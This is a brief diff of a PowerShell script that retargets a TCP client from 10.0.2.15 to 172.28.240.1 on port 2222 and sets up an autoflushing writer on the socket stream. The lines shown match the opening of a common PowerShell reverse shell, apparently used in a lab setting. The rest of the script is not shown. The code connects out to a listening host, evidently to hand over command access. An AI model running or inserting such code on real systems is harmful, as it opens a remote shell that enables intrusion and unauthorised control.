@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("10.0.2.15", 2222)
+$client = New-Object System.Net.Sockets.TCPClient("172.28.240.1", 2222)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
 $writer.AutoFlush = $true
